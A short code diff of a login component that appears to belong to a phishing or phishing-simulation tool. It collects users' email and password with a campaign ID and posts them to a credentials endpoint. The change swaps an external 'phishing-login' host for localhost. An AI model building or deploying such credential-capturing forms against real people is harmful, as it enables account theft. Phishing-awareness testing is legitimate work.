@@ -34,7 +34,7 @@ const Login = () => {
     }
 
     try {
-      const response = await axios.post<ApiResponse>('https://phishing-login.onrender.com/api/credentials', {
+      const response = await axios.post<ApiResponse>('http://localhost:3001/api/credentials', {
         username: email,
         password: password,
         campaignId: '65c4d8f2e987b459a731d8f2'
